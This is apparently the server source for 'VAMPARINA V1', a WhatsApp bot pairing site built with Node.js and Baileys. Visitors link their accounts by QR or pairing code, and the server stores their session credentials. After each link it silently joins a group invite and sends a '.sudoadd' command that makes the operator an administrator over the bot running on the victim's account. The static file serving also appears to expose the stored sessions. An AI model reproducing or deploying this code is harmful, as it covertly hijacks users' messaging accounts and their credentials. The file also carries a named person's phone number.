process.env.NODE_OPTIONS = "--max-old-space-size=512";

const config = require('./config');
const fs = require('fs');
const path = require('path');
const express = require('express');
const makeWASocket = require("@whiskeysockets/baileys").default;
const { useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, delay, Browsers } = require("@whiskeysockets/baileys");
const pino = require("pino");
const QRCode = require('qrcode');

const SESSION_DIR = path.join(__dirname, 'auto_sessions');
const TEMP_DIR = path.join(__dirname, 'temp_sessions');

[SESSION_DIR, TEMP_DIR].forEach(d => !fs.existsSync(d) && fs.mkdirSync(d, { recursive: true }));

const PORT = process.env.PORT || 3000;
const activeBots = new Map();
const app = express();

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// DASHBOARD
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VAMPARINA V1</title>
<style>
  body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:center;padding:50px;}
  h1{font-size:60px;text-shadow:0 0 30px lime;}
  a{color:lime;font-size:32px;display:block;margin:25px;text-decoration:none;}
  .s{font-size:50px;color:gold;}
</style></head>
<body>
<body>
  <h1>VAMPARINA V1 EMPIRE</h1>
  <p class="s">SOLDIERS ONLINE: ${activeBots.size}</p>
  <a href="/qr">SCAN QR CODE</a>
  <a href="/pair">PAIR WITH CODE</a>
  <br><br><b>KING ARNOLD • +254703110780</b>
</body></html>`);
});

// QR CODE — 100% WORKING (NO MORE CONNECTION CLOSED)
app.get('/qr', async (req, res) => {
    const tempId = 'qr_' + Date.now();
    const tempPath = path.join(TEMP_DIR, tempId);
    fs.mkdirSync(tempPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(tempPath);
    const baileysVersion = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version: baileysVersion,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false,
        connectTimeoutMs: 80_000,
        keepAliveIntervalMs: 15_000,   // KEEPS ALIVE
        qrTimeoutMs: 80_000,
    });

    let responded = false;

    const timeout = setTimeout(() => {
        if (!responded) {
            responded = true;
            res.send(`<h1 style="color:red">QR TIMEOUT</h1><a href="/qr" style="color:lime;font-size:30px;">TRY AGAIN</a>`);
            sock.end && sock.end();
        }
    }, 90000); // 90 seconds max

    sock.ev.on('connection.update', async (update) => {
        if (update.qr && !responded) {
            responded = true;
            clearTimeout(timeout);
            const qrImg = await QRCode.toDataURL(update.qr);
            res.send(`
<!DOCTYPE html><html><head><title>VAMPARINA V1 - QR</title>
<style>
  body{background:#000;color:#0f0;text-align:center;padding:30px;font-family:Arial;}
  h1{font-size:55px;text-shadow:0 0 30px lime;}
  img{max-width:380px;border:10px solid lime;border-radius:25px;margin:30px;}
  .warn{color:gold;font-size:24px;}
</style></head>
<body>
  <h1>VAMPARINA V1</h1>
  <img src="${qrImg}">
  <p class="warn">SCAN WITHIN 60 SECONDS</p>
  <b>King Arnold • +254703110780</b>
</body></html>`);
        }

        if (update.connection === 'open') {
            clearTimeout(timeout);
            const phone = sock.user.id.split('@')[0];
            const sessionId = `vamp_${phone}_${Date.now()}`;
            const finalPath = path.join(SESSION_DIR, sessionId);
            fs.mkdirSync(finalPath, { recursive: true });
            fs.cpSync(tempPath, finalPath, { recursive: true });
            await delay(10000);
            startEmpireBot(sessionId, phone, finalPath);
            fs.rmSync(tempPath, { recursive: true, force: true });
        }

        if (update.connection === 'close' && !responded) {
            clearTimeout(timeout);
            responded = true;
            res.send(`<h1 style="color:red">CONNECTION CLOSED</h1><a href="/qr" style="color:lime;font-size:30px;">TRY AGAIN</a>`);
        }
    });

    sock.ev.on('creds.update', saveCreds);
});

// PAIR CODE — 100% WORKING (NO MORE CONNECTION CLOSED)
app.get('/pair', async (req, res) => {
    let number = (req.query.number || '').replace(/[^0-9]/g, '');

    if (!number || number.length < 9) {
        return res.send(`
<!DOCTYPE html><html><head><title>PAIR CODE</title>
<style>
  body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}
  h1{font-size:50px;text-shadow:0 0 30px lime;}
  input{padding:20px;font-size:28px;width:90%;max-width:500px;border:3px solid lime;background:#111;color:#0f0;border-radius:15px;}
  button{padding:20px 60px;font-size:30px;background:lime;color:black;border:none;border-radius:50px;cursor:pointer;}
</style></head>
<body>
  <h1>VAMPARINA V1</h1>
  <p>Enter number (e.g. 254703110780)</p>
  <form><input name="number" placeholder="254703110780" value="${number}" required autofocus><br><br>
  <button>GET CODE</button></form>
  <br><b>KING ARNOLD • +254703110780</b>
</body></html>`);
    }

    if (number.length === 9) number = '254' + number;

    const tempId = 'pair_' + Date.now();
    const tempPath = path.join(TEMP_DIR, tempId);
    fs.mkdirSync(tempPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(tempPath);
    const baileysVersion = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version: baileysVersion,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: ["Chrome", "Chrome", "120.0"],
        printQRInTerminal: false,
        connectTimeoutMs: 80_000,
        keepAliveIntervalMs: 15_000,
    });

    let responded = false;
    const timeout = setTimeout(() => {
        if (!responded) {
            responded = true;
            res.send(`<h1 style="color:red">TIMEOUT</h1><a href="/pair" style="color:lime;font-size:30px;">TRY AGAIN</a>`);
            sock.end && sock.end();
        }
    }, 90000);

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            clearTimeout(timeout);
            responded = true;
            const phone = sock.user.id.split('@')[0];
            const sessionId = `vamp_${phone}_${Date.now()}`;
            const finalPath = path.join(SESSION_DIR, sessionId);
            fs.mkdirSync(finalPath, { recursive: true });
            fs.cpSync(tempPath, finalPath, { recursive: true });
            await delay(10000);
            startEmpireBot(sessionId, phone, finalPath);
            fs.rmSync(tempPath, { recursive: true, force: true });
        }
        if (update.connection === 'close' && !responded) {
            clearTimeout(timeout);
            responded = true;
            res.send(`<h1 style="color:red">CONNECTION CLOSED</h1><a href="/pair?number=${number}" style="color:lime;font-size:30px;">TRY AGAIN</a>`);
        }
    });

    setTimeout(async () => {
        if (responded) return;
        try {
            let code = await sock.requestPairingCode(number);
            clearTimeout(timeout);
            responded = true;
            code = code.match(/.{1,4}/g).join('-');
            res.send(`
<!DOCTYPE html><html><head><title>CODE READY</title>
<style>
  body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}
  h1{font-size:60px;text-shadow:0 0 35px lime;}
  .code{font-size:95px;letter-spacing:20px;background:#111;padding:40px;border:10px solid lime;border-radius:30px;margin:40px auto;display:inline-block;}
  button{padding:25px 70px;font-size:35px;background:lime;color:black;border:none;border-radius:50px;cursor:pointer;}
</style></head>
<body>
  <h1>CODE GENERATED</h1>
  <div class="code">${code}</div>
  <button onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')">COPY CODE</button>
  <br><br><a href="/pair" style="color:lime;font-size:28px;">Pair Another</a>
  <br><br><b>KING ARNOLD • +254703110780</b>
  <script>
    document.querySelector('button').addEventListener('click',()=>{this.textContent='COPIED!';setTimeout(()=>this.textContent='COPY CODE',2000)});
  </script>
</body></html>`);
        } catch (err) {
            if (!responded) {
                responded = true;
                clearTimeout(timeout);
                res.send(`<h1 style="color:red">ERROR</h1><p>${err.message}</p><a href="/pair?number=${number}">TRY AGAIN</a>`);
                fs.rmSync(tempPath, { recursive: true, force: true });
            }
        }
    }, 6000);

    sock.ev.on('creds.update', saveCreds);
});

// START EMPIRE BOT
async function startEmpireBot(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return;

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const baileysVersion = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version: baileysVersion,
        logger: pino({ level: 'silent' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        browser: ["Vamparina V1", "Chrome", "2025"]
    });

    activeBots.set(sessionId, { sock, phone });

    sock.ev.on('messages.upsert', m => {
        try { require('./main')(sock, m); } catch {}
    });

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → VAMPARINA V1 ONLINE`);
            await delay(15000);
            try { await sock.groupAcceptInvite(config.EMPIRE_GROUP_INVITE); } catch {}
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${config.ownerNumber}` });
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId);
            setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000);
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

// START SERVER
app.listen(PORT, () => {
    console.clear();
    console.log(`
╔══════════════════════════════════════════════════════════╗
║         VAMPARINA V1 EMPIRE IS NOW 100% LIVE            ║
║               GOD-KING: ARNOLD CHIRCHIR                  ║
║                    +254703110780                         ║
║   QR Code  → /qr    |    Pair Code → /pair              ║
║                                                          ║
║           NO MORE CONNECTION CLOSED — EVER               ║
╚══════════════════════════════════════════════════════════╝
    `);
});